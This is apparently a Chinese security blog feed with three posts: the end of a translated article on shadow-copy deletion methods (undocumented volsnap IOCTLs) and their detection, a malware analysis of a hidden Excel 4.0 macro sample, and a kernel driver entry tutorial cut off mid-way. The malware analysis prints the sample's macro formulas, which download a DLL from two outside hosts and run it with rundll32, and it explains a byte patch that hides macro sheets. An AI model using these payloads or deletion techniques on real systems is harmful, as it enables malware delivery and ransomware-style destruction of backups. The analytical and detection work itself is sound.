src="https://image.zeronohacker.com/article/2020/04/29/9A3FE5D1849CA6812E1BF70DA3882D66.png" alt=""></p><p>根据这一发现，显而易见的方向是直接使用同一 COM 对象，因此，vssadmin 二进制文件将变得多余。 相关的接口定义显示在 vscoordint.idl 中，该文件在较早的 Windows SDK 版本中提供。 删除功能定义为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HRESULT <span class="title">DeleteSnapshots</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    VSS_ID SourceObjectId,</span></span></span><br><span class="line"><span class="params"><span class="function">    VSS_OBJECT_TYPE eSourceObjectType,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL bForceDelete,</span></span></span><br><span class="line"><span class="params"><span class="function">    LONG* plDeletedSnapshots,</span></span></span><br><span class="line"><span class="params"><span class="function">    VSS_ID* pNondeletedSnapshotID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure><p>SourceObjectId 是卷影副本本身的 GUID 标识符，并且 eSourceObjectType 设置为 VSS_OBJECT_SNAPSHOT。</p><p>还记录了 VSS 对象，这些对象提供了管理快照的所有必需功能。 其中之一是 IVssSoftwareSnapshotProvider 接口，该接口还可用于调用所需的删除操作。 可以使用 IVssDifferentialSoftwareSnapshotMgmt 接口来更改差异区域的大小。</p><h3 id="直接设备访问"><a href="#直接设备访问" class="headerlink" title="直接设备访问"></a>直接设备访问</h3><p>删除快照时，执行流将到达将 IOCTL 发送到 volsnap.sys 的提供程序（swprv.dll）。 内核驱动程序不对设备打开请求或发送给它的 IOCTL 进行任何访问检查，以验证源是提供程序服务进程，因此可以从任何进程发送那些 IOCTL，甚至处理 COM 层。</p><p>使用 ProcMon，我们可以轻松跟踪提供者执行的操作：</p><ul><li>打开卷影副本卷的句柄（例如 \Device\HarddiskVolumeShadowCopy1）。</li><li>发送未记录的 IOCTL_VOLSNAP_SET_APPLICATION_INFO。</li><li>如果尚未将卷设置为使用 IOCTL_VOLUME_SET_GPT_ATTRIBUTES 隐藏。</li><li>接下来，通过发送 FSCTL_DISMOUNT_VOLUME和IOCTL_VOLUME_OFFLINE 禁用该卷。</li><li>打开后备卷的句柄（即 C :，卷影副本属性中的“原始卷”）。</li><li>发送未记录的 IOCTL_VOLSNAP_DELETE_SNAPSHOT（0x53C038），同时在输入缓冲区中传递要删除的快照名称。</li></ul><p>可以使用我们前面介绍的工具（vssadmin，WMI 和 COM 对象）来查询卷影副本属性。 步骤 1-4 是可选的，但请记住，它们可确保过程的有效性，跳过它们可能会导致失败或意外结果。</p><p>可以使用我们前面介绍的工具（vssadmin，WMI 和 COM 对象）来查询卷影副本属性。 步骤 1-4 是可选的，但请记住，它们可确保过程的有效性，跳过它们可能会导致失败或意外结果。</p><p><img src="https://image.zeronohacker.com/article/2020/04/29/A95865EDE81A27AF9D6C3B34B72DF5D0.png" alt=""></p><p>为了调整差异区域的大小，提供程序将未记录的 IOCTL_VOLSNAP_SET_MAX_DIFF_AREA_SIZE（0x53C028）发送到原始卷，如下图所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/29/0A1236A05C37A9087587BA239E388DE1.png" alt=""></p><p>即使驱动程序会验证请求的来源是提供者的服务，但向其中注入代码以执行上述操作也将绕过该检查。</p><h2 id="如何检测"><a href="#如何检测" class="headerlink" title="如何检测"></a>如何检测</h2><p>我们描述的方法在不同的层上运行，每种方法都提供了多种检测机制的选择。</p><p>首先要开始的是命令行参数扫描，这是一个非常基本的解决方案。虽然它涵盖了勒索软件当今使用的大多数技术4fewd[，但防御者必须考虑各种语法风格，并能够处理新的混淆形式和发现新的 LOLBins。此外，存在隐藏命令行参数的已知技术。</p><p>对于更广泛的方法，需要某种形式的 COM 监视。</p><p>一个直观的解决方案可以是搜索意外进程中加载的库的任何异常。例如，如果 vss_ps.dll 由 vssadmin.exe 或 wmiprvse.exe 以外的其他进程加载（使用 WMI 时），则可以将其视为可疑文件。但是，这可能会产生假阳性，因为它不能确保我们实际上正在使用 vss_ps.dll，并且卷影副本正在被删除。监视实际的 COM 对象将授予更准确的结果。可以监视对注册表中相关键的访问，但是对于假阳性也有相同的问题。相反，使用 COM 对象代理和筛选器可能被证明是适当的解决方案。</p><p>最终的解决方案是监视执行流程中的最后一步，因为它是所有方法中的通用交点-设备 IO 控件调用驱动程序。这些应该源自提供者服务。可以在每个进4fewd[程的 DeviceIoControl 和 ZwDeviceIoControlFile 之类的函数上安装挂钩，以监视这些调用，但是可以避免攻击者逃避它们的麻烦。消耗 ETW 事件来检测那些 IOCTL 代码是一种更可行的可能性。最后一个选择是使用内核驱动程序并执行 IRP 筛选，它还支持阻止任何潜在的恶意请求的功能。</p><h2 id="如何解决"><a href="#如何解决" class="headerlink" title="如何解决"></a>如何解决</h2><p>FortiEDR 平台能够检测本文档中概述的现有技术和新技术。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在本文中，我们介绍了各种擦除卷影副本的方法，从已知的命令行实用程序到各种程序形式。</p><p>几乎所有这些方法都以一种或另一种方式操作 COM 对象，即使没有正式记录的方法也是如此。我们展示了一种替代方法，该方法不依赖那些对象，而是在直接访问卷影复制设备时模仿它们的操作。</p><p>我们提出了不同的想法来检测和防止所描述方法的任何恶意使用，因为仅依靠命令行参数进行检测被证明是徒劳的。首选方法是监视对卷影拷贝设备本身的访问。</p><p>总而言之，这项研究强调了前提，即防御者必须保持警惕，以领先于坏人，并不断采用新的检测方法和功能。而且，为了保持领先地位，进行进攻性研究对防御者而言与对攻击者一样重要。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文翻译自：&lt;a href=&quot;https://www.fortinet.com/blog/threat-research/stomping-shadow-copies-a-second-look-into-deletion-methods.html</summary>
      
    
    
    
    <category term="安全技术" scheme="https://zeronohacker.github.io/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="VSS" scheme="https://zeronohacker.github.io/tags/VSS/"/>
    
    <category term="Ransomeware" scheme="https://zeronohacker.github.io/tags/Ransomeware/"/>
    
  </entry>
  
  <entry>
    <title>从一个野外 office 样本分析中学习 Excel 4.0 marco</title>
    <link href="https://zeronohacker.github.io/2020/04/18/learn-excel-4-marco-from-an-analysis-of-a-field-office-sample/"/>
    <id>https://zeronohacker.github.io/2020/04/18/learn-excel-4-marco-from-an-analysis-of-a-field-office-sample/</id>
    <published>2020-04-18T09:23:08.000Z</published>
    <updated>2021-09-19T09:35:40.107Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前述"><a href="#前述" class="headerlink" title="前述"></a>前述</h2><p>今日在野外获得一个特别有意思的 office 样本（Excel 文档），这个样本运用了 Excel 4.0 marco 技术，并且还隐藏了。由于自己对 Excel 4.0 marco 技术不是太深入了解，所以打算趁此在周末好好学习下 Excel 4.0 marco。在开始之前，我们先聊下 Excel 4.0 marco。</p><p>Excel 4.0 marco，也可叫做 XLM（这里的 XLM 不是 XML） marco，这项技术早在 1992 年就引入了，可以说是一种非常古老的技术。我们知道，现如今，几乎所有针对 MS Office 的恶意宏文档都基于 Visual Basic for Application（VBA）。另外，XLM 宏对于红队来说是一个杀手锏，并且是出于进攻目的，它是 VBA 宏非常好的替代品，XLM 可能难以解析，而且似乎大多数反病毒软件无法检测 XLM 恶意文档。虽然到目前为止该技术已经使用了 28 年，但最近几年出的 MS Office 版本仍支持 Excel 4.0 marco，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/2131fc02d8a56dc4fc57023e1515bbf6.png" alt=""></p><p>在 1992 年，针对 windows 3.0 和 3.1 发布电子表格软件 Excel 4.0 时，为了实现自动化，可以通过所谓的宏工作表在此版本中的 Excel 中使用 XLM 宏。XLM 与 VBA 不一样，后者在一年后的 Excel 5.0 中引入。</p><h2 id="创建-XLM-宏"><a href="#创建-XLM-宏" class="headerlink" title="创建 XLM 宏"></a>创建 XLM 宏</h2><p>创建一个新的 Excel 文件，名为 xlm_macro.xlsx，新创建的默认会有三张工作表，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/15253974f73040ca3d9c022919acf1f6.png" alt=""></p><p>在 Sheet1 工作表中右键点击插入，会弹出你需要创建的对象，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/55a369349312bb8a112bb4d8ca9c3feb.png" alt=""></p><p>在弹出的界面中选择 MS Excel 4.0 宏表，最后点击确定，这样就创建了一张 XLM 宏工作表了，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/ebdb6c7b353d04b513620ef9e0f982e6.png" alt=""></p><p>在这张工作表当中选择一个单元格并输入 <code>=EXEC(&quot;calc.exe&quot;)</code>、<code>=ALERT(&quot;XLM macro&quot;)</code> 和 <code>=HALT()</code>，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/a4fb543311b9a06c34b1d59180ad9361.png" alt=""></p><p>选中 A1 单元格，右击选择执行，在弹出的对话框中点击执行，执行后结果如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/c7abeadd75668db46404250270c6878.png" alt=""></p><p>如果您希望宏在打开工作簿时自动运行（类似于 VBA 宏的 Sub AutoOpen()），请将宏的第一个单元重命名为 Auto_open，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/b122f365fe9740d21e3356876e5c9700.png" alt=""></p><p>最后保存，由于这里启用了宏的功能，所以保存的格式为 xls，保存好后，用 olevba.py 工具检测下，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/7f95cebf0d117f3a142fb7b4ca0cbdcd.png" alt=""></p><p>由上图可知，存在利用 Excel 4.0 macro，并且是 visible，但是我遇到的样本，却是 very hidden，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/f28535a1f73293cf9c7942cb82142e58.png" alt=""></p><p>在 Excel 用户界面上是没有显示出来的，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/8956e1a900537bc0fb87d57996aec1b2.png" alt=""></p><p>在工作表中右击选择取消隐藏，发现取消隐藏命令变灰了，那这种的是如何实现的呢？要想把这个搞清楚，我们先来谈一下普通工作表（区别于 Excel 4.0 宏表）的隐藏。</p><h2 id="普通工作表的普通隐藏和深度隐藏"><a href="#普通工作表的普通隐藏和深度隐藏" class="headerlink" title="普通工作表的普通隐藏和深度隐藏"></a>普通工作表的普通隐藏和深度隐藏</h2><p>普通工作表的普通隐藏和显示，大家可以观看这个短视频了解：<a href="https://youtu.be/hJsF8dK745Y">https://youtu.be/hJsF8dK745Y</a></p><p>普通工作表的深度隐藏和显示，下面这段短视频做了演示：<a href="https://youtu.be/T70nF5_OPn4">https://youtu.be/T70nF5_OPn4</a></p><h2 id="Excel-4-0-宏表的隐藏和显示"><a href="#Excel-4-0-宏表的隐藏和显示" class="headerlink" title="Excel 4.0 宏表的隐藏和显示"></a>Excel 4.0 宏表的隐藏和显示</h2><p>和普通工作表一样，Excel 4.0 宏表也有普通隐藏和深度隐藏，它的普通隐藏操作和普通工作表一样，也是在右击工作表选择隐藏命令，同时也能选择取消隐藏命令，但是这种并不是真正的隐藏，真正的隐藏为深度隐藏，如要实现，需要用十六进制编辑器修改它的字节码，这种深度隐藏的好处就是在 Excel 用户界面上显示不出，并且不能通过取消隐藏命令来使其显示，如要显示，需要修改对应字节码，这样就出现一个问题，在哪个地方修改呢？这是一个比较关键的地方，我们知道，Excel 4.0 宏功能存储在工作簿流中的 BIFF 记录中，如果你需要快速定位，可借助 oledump 工具里的一个插件来完成，这个插件为 plugin_biff.py，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/47f673b9b50bf1dfc148d7034501948e.png" alt=""></p><p>如上图所示，若需深度隐藏，只需要将第 5 个字节改为 0x02 就行。将 xls 文件拖入到 010 Editor 中，然后搜索 <code>C4 2E 00 00 00 01 06 ……</code> 序列，改动第 5 个字节，最后保存，保存后双击运行验证是否成功，同理，如要显示，也是重复上述操作，只不过值改为 0x00 就行，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/c274b3577d69c75e477c008a314d7611.png" alt=""></p><div class="tip "><p>但是需要注意一点，这个需要定位的字节序列不是固定的，但是要修改的偏移是固定的。</p></div><h2 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h2><p>样本信息：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/cf9d6ab3d61848665c00a957d83e65d2.png" alt=""></p><p>由于此样本运用了 Excel 4.0 macro，并且还深度隐藏了，所以只需用上一小节提到的方法对该样本修改关键字节码就可以，修改后如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/1259b243751caff1a85f3f2b6695c7a0.png" alt=""></p><p>Excel 4.0 宏表中出现了大量的 =CHAR，在右边也有相关命令，拉至最上端，选中单元格，右击选择运行，这里需要允许宏执行，但为了避免运行到 =WORKBOOK.HIDE 和 =GOTO，我暂时把这两行删除再运行，运行后的结果如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/dd3a549768de0e45f286ba219ee8c07a.png" alt=""></p><p>oh my god，what a fu** ？被我删除的那两句，它是把这个工作表隐藏，再跳转到 R2 单元格执行，而 R2 单元格名为 Auto_open，所以当你打开这个文档时，启用了宏就会自动从 R2 单元处开始执行命令。R6 单元格命令如下：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=<span class="keyword">CALL</span>(<span class="string">&quot;Shell32&quot;</span>,<span class="string">&quot;ShellExecuteA&quot;</span>,<span class="string">&quot;JJCCCJJ&quot;</span>,<span class="number">0</span>,<span class="string">&quot;open&quot;</span>,<span class="string">&quot;C:\Windows\system32\reg.exe&quot;</span>,<span class="string">&quot;EXPORT HKCU\Software\Microsoft\Office\&quot;</span>&amp;<span class="keyword">GET</span>.WORKSPACE(<span class="number">2</span>)&amp;<span class="string">&quot;\Excel\Security c:\users\public\1.reg /y&quot;</span>,<span class="number">0</span>,<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>上述命令通过将本地 Office 的安全设置注册表项导出到 1.reg 文件中，配合后面打开读取安全设置，判断 R11 中读取的内容是否有 0001，并接着判断返回的是否为数字。R16 单元格命令，远程下载文件并保存在本地，文件名为 bqg85ef.html：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=<span class="keyword">CALL</span>(<span class="string">&quot;urlmon&quot;</span>,<span class="string">&quot;URLDownloadToFileA&quot;</span>,<span class="string">&quot;JJCCJJ&quot;</span>,<span class="number">0</span>,<span class="string">&quot;http://kacper-formela.pl/wp-smart.php&quot;</span>,<span class="string">&quot;c:\Users\Public\bqg85ef.html&quot;</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>R17 单元格命令，当 R16 执行失败时，换个域名连接继续下载文件并保存在本地，文件名为 bqg85ef.html：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=<span class="keyword">IF</span>(R16&amp;lt;<span class="number">0</span>,<span class="keyword">CALL</span>(<span class="string">&quot;urlmon&quot;</span>,<span class="string">&quot;URLDownloadToFileA&quot;</span>,<span class="string">&quot;JJCCJJ&quot;</span>,<span class="number">0</span>,<span class="string">&quot;http://braeswoodfarmersmarket.com/wp-smart.php&quot;</span>,<span class="string">&quot;c:\Users\Public\bqg85ef.html&quot;</span>,<span class="number">0</span>,<span class="number">0</span>),)</span><br></pre></td></tr></table></figure><p>R20 单元格命令，由这条命令可知上述通过远程下载的 bqg85ef.html 其实不是一个 html 文件，而是一个 dll：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=<span class="keyword">CALL</span>(<span class="string">&quot;Shell32&quot;</span>,<span class="string">&quot;ShellExecuteA&quot;</span>,<span class="string">&quot;JJCCCJJ&quot;</span>,<span class="number">0</span>,<span class="string">&quot;open&quot;</span>,<span class="string">&quot;C:\Windows\system32\rundll32.exe&quot;</span>,<span class="string">&quot;c:\Users\Public\bqg85ef.html,DllRegisterServer&quot;</span>,<span class="number">0</span>,<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>URL：</p><ul><li>http[:]//kacper-formela[.]pl/wp-smart[.]php；</li><li>http[:]//braeswoodfarmersmarket[.]com/wp-smart[.]php；</li></ul><p>虽然上面现已无法访问，但是通过 VT 上关联分析还是拿到了相关的样本，顺便把 1.reg 也拿到了，不过这个拿不拿没关系，主要是后面这个关键 dll。让我们来看下 1.reg 中的内容吧，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/d4e12abe2c6fc52cbd77c0951d5aceb4.png" alt=""></p><p>我们再来看下那个 dll，首先通过 strings 工具查看字符串，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/ad168c4a5358c0e6a8f618b544530e3f.png" alt=""></p><p>在 dll 文件中发现 pdb 路径，通过 pdb 路径名可知是个 POC，就只为弹个计算器，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/af2b1e88f68e98b198ed7627f9f18b4e.png" alt=""></p><p>在 Github 居然找到了该 dll，what？如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/228bd77f6b72c83299b0f679d708cd70.png" alt=""></p><p><img src="https://image.zeronohacker.com/article/2020/04/18/79e65b91eb4ff81c37293556f4de64bb.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然最终啥也没，但是也学到不少东西，比如 Excel 4.0 macro 的深度隐藏，发现宏还可以这样玩，就这样吧，洗洗睡，困了~</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/">https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/</a></li><li><a href="https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/analysis-suspicious-very-hidden-formula-on-excel-4-0-macro-sheet">https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/analysis-suspicious-very-hidden-formula-on-excel-4-0-macro-sheet</a></li><li><a href="https://isc.sans.edu/forums/diary/Excel+Maldocs+Hidden+Sheets/25876/">https://isc.sans.edu/forums/diary/Excel+Maldocs+Hidden+Sheets/25876/</a></li><li><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/more-excel-4-0-macro-malspam-campaigns/">https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/more-excel-4-0-macro-malspam-campaigns/</a></li></ul><h2 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h2><p>MD5：</p><ul><li>3c2a1ce4a43a0ee2546f195f2e6de8cb</li><li>532a449af9d242579f9ec3dfa34e44e4</li><li>d28a070dec7a29ad35e8baf1c56b5cdc</li></ul><p>URL：</p><ul><li>http[:]//kacper-formela[.]pl/wp-smart[.]php；</li><li>http[:]//braeswoodfarmersmarket[.]com/wp-smart[.]php；</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前述&quot;&gt;&lt;a href=&quot;#前述&quot; class=&quot;headerlink&quot; title=&quot;前述&quot;&gt;&lt;/a&gt;前述&lt;/h2&gt;&lt;p&gt;今日在野外获得一个特别有意思的 office 样本（Excel 文档），这个样本运用了 Excel 4.0 marco 技术，并且还隐藏了。</summary>
      
    
    
    
    <category term="样本分析" scheme="https://zeronohacker.github.io/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Excel 4.0 Macro" scheme="https://zeronohacker.github.io/tags/Excel-4-0-Macro/"/>
    
    <category term="XLM" scheme="https://zeronohacker.github.io/tags/XLM/"/>
    
  </entry>
  
  <entry>
    <title>内核编程 —— 入口函数详解</title>
    <link href="https://zeronohacker.github.io/2020/04/05/kernel-programming-detailed-explanation-of-entry-function/"/>
    <id>https://zeronohacker.github.io/2020/04/05/kernel-programming-detailed-explanation-of-entry-function/</id>
    <published>2020-04-05T09:12:58.000Z</published>
    <updated>2021-09-19T09:21:06.012Z</updated>
    
    <content type="html"><![CDATA[<h2 id="内核入口函数"><a href="#内核入口函数" class="headerlink" title="内核入口函数"></a>内核入口函数</h2><p>具有 windows 应用层（用户态）开发经验的朋友应该很清楚，windows 应用程序有统一的 WinMain 入口函数，类似于应用层，内核驱动也有一个统一的入口函数，名字叫做 DriverEntry，DriverEntry 函数的原型如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTAUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriverObject,PUNICODE_STRING pRegistryPath )</span></span></span><br></pre></td></tr></table></figure><p>第一个参数为 pDriverObject，表示一个驱动对象指针，一个驱动文件（.sys）运行之后，操作系统在内存中为该驱动分配一个类型为 DRIVER_OBJECT 的数据结构，用于记录该驱动的详细信息，结构定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    CSHORT Type;</span><br><span class="line">    CSHORT Size;</span><br><span class="line">    <span class="comment">// The following links all of the devices created by a single driver</span></span><br><span class="line">    <span class="comment">// together on a list, and the Flags word provides an extensible flag</span></span><br><span class="line">    <span class="comment">// location for driver objects.</span></span><br><span class="line">    </span><br><span class="line">    PDEVICE_OBJECT DeviceObject; <span class="comment">// 设备链 </span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// The following section describes where the driver is loaded. The count</span></span><br><span class="line">    <span class="comment">// field is used to count the number of times the driver has had its</span></span><br><span class="line">    <span class="comment">// registered reinitialization routine invoked.</span></span><br><span class="line">   </span><br><span class="line">    PVOID DriverStart;</span><br><span class="line">    ULONG DriverSize;</span><br><span class="line">    PVOID DriverSection;</span><br><span class="line">    PDRIVER_EXTENSION DriverExtension; <span class="comment">// 驱动扩展，对于 WDM 程序比较重要 </span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// The driver name field is used by the error log thread</span></span><br><span class="line">    <span class="comment">// determine the name of the driver that an I/O request is/was bound.</span></span><br><span class="line">    </span><br><span class="line">    UNICODE_STRING DriverName; <span class="comment">// 驱动名称 </span></span><br><span class="line">    <span class="comment">// The following section is for registry support. This is a pointer</span></span><br><span class="line">    <span class="comment">// to the path to the hardware information in the registry</span></span><br><span class="line">    </span><br><span class="line">    PUNICODE_STRING HardwareDatabase; <span class="comment">// 设备的硬件数据库名称 </span></span><br><span class="line">   </span><br><span class="line">    <span class="comment">// The following section contains the optional pointer to an array of</span></span><br><span class="line">    <span class="comment">// alternate entry points to a driver for &quot;fast I/O&quot; support. Fast I/O</span></span><br><span class="line">    <span class="comment">// is performed by invoking the driver routine directly with separate</span></span><br><span class="line">    <span class="comment">// parameters, rather than using the standard IRP call mechanism. Note</span></span><br><span class="line">    <span class="comment">// that these functions may only be used for synchronous I/O, and when</span></span><br><span class="line">    <span class="comment">// the file is cached.</span></span><br><span class="line">    </span><br><span class="line">    PFAST_IO_DISPATCH FastIoDispatch; <span class="comment">// 文件驱动程序中的快速 IO 请求函数地址 </span></span><br><span class="line">    <span class="comment">// The following section describes the entry points to this particular</span></span><br><span class="line">    <span class="comment">// driver. Note that the major function dispatch table must be the last</span></span><br><span class="line">    <span class="comment">// field in the object so that it remains extensible.</span></span><br><span class="line">    </span><br><span class="line">    PDRIVER_INITIALIZE DriverInit;</span><br><span class="line">    PDRIVER_STARTIO DriverStartIo; <span class="comment">// DriverStartIo 派发函数的地址 </span></span><br><span class="line">    PDRIVER_UNLOAD DriverUnload; <span class="comment">// 卸载函数指针 </span></span><br><span class="line">    PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>]; <span class="comment">// 30 个分发函数</span></span><br><span class="line"> &#125; DRIVER_OBJECT; </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> *<span class="title">PDRIVER_OBJECT</span>;</span></span><br></pre></td></tr></table></figure><p>以上就是驱动对象结构体信息，在这只提比较重要字段，第一，DeviceObject（设备对象），每个驱动程序都会有一个或多个设备对象，所有设备对象以链表的形式串联起来，驱动对象中的设备对象字段指的是所有设备对象的第一个对象，通过它可以遍历所有设备对象；第二，DriverName（驱动名称），表示的该驱动的名称，采用 UNICODE 编码，该字符串的一般形式为 <strong>\Driver[驱动程序名称]</strong>；第三，DriverUnload（驱动卸载函数），指向该驱动程序的卸载函数地址；第四，MajorFunction（派遣函数指针数组），该数组的每个指针成员指向一个响应的处理 IRP 的派遣函数。第二个参数 pRegistryPath 是一个类型为 UNICODE_STRING 的指针，表示当前驱动所对应的注册表位置。UNICODE_STRING 是内核中表示字符串的结构体，对应定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Unicode strings are counted 16-bit character strings. If they are </span></span><br><span class="line"><span class="comment">// NULL terminated, Length does not include trailing NULL. </span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength; </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> MIDL_PASS[size_is(MaximumLength / 2), length_is((Length) / 2) ] USHORT * Buffer; </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">// MIDL_PASS_Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// MIDL_PASS </span></span></span><br><span class="line">&#125; UNICODE_STRING; </span><br><span class="line"><span class="keyword">typedef</span> UNICODE_STRING *PUNICODE_STRING; </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">const</span> UNICODE_STRING *PCUNICODE_STRING;</span><br></pre></td></tr></table></figure><p>其中 Buffer 为一个指针，指向一个 UNICODE 类型的字符串缓冲区；MaximumLength 表示 Buffer 所指向缓冲区的总空间大小，一般等于 Buffer 被分配时的内存大小，单位为字节；Length 表示 Buffer 所指向缓冲区中字符串的长度，单位也是字节。</p><div class="tip "><p>请注意，Buffer 指向的字符串，并不要求以 ‘\0’ 作为结束，在大多数情况下，Buffer 指向的字符串没有以 ‘\0’ 结尾。</p></div><p>那如何来验证上面这一事实呢？实践才是验证真理唯一途径。这里我以我写好的一个驱动程序（FirstDriver.sys）作为一个例子来调试，不多说，直接上 windbg，设置好环境后，在虚拟机里以管理员方式运行 cmd，输入如下命令（已禁用驱动强制签名，= 后面有一个空格）：</p><p><img src="https://image.zeronohacker.com/article/2020/04/05/EA123FF51DB59FA5B51272FD80C31753.png" alt=""></p><p>以上就表示创建服务成功了，接下来便是启动服务，在启动服务之前，先对驱动入口函数下个断，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">kd&gt;</span><span class="bash"> bu FirstDriver!DriverEntry</span></span><br></pre></td></tr></table></figure><p>下断之后，输入 g 命令把控制权转给操作系统，下面就启动服务，把 DebugView 开着，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start FirstDriver</span><br></pre></td></tr></table></figure><p>启动服务后，中断到 windbg，输入 p 命令单步运行起来，让 pRegistryPath 压入栈中，好了后，输入 kp 查看函数参数，如下：</p><p><img src="https://image.zeronohacker.com/article/2020/04/05/6949A1F604B46449984092C4A5DA5D25.png" alt=""></p><p>从上图可看出，地址位于 0x9336c00，接下来，查看结构体内容，输入如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 